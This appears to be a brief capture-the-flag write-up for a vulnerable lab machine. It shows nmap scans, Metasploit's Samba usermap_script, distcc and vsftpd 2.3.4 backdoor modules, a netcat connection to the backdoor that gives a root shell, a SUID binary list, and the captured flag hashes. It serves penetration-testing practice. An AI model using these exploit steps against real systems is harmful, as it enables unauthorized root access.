## Recon


```sh
Host is up, received echo-reply ttl 63 (0.97s latency).
Scanned at 2024-06-03 00:00:35 GMT for 13s

PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host is up (0.32s latency).
Not shown: 2000 filtered tcp ports (no-response)
PORT     STATE SERVICE
3632/tcp open  distccd



```


```sh
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


cat makis/user.txt
863479f2d25ddd698979c32a59366626

cat /root/root.txt
ecf9899b2dbd90120602bccb11042ee1

```


## 2nd Method
```sh
Nmap scan report for 10.129.2.95
Host is up (0.47s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

unix/misc/distcc_exec
```


```sh
rhosts => 10.129.2.95
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.129.2.95:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.2.95:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

daemon@lame:/home$ nc -nv 0.0.0.0 6200
(UNKNOWN) [0.0.0.0] 6200 (?) open
id
uid=0(root) gid=0(root)
whoami
root

```


## 3rd
```sh
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown


```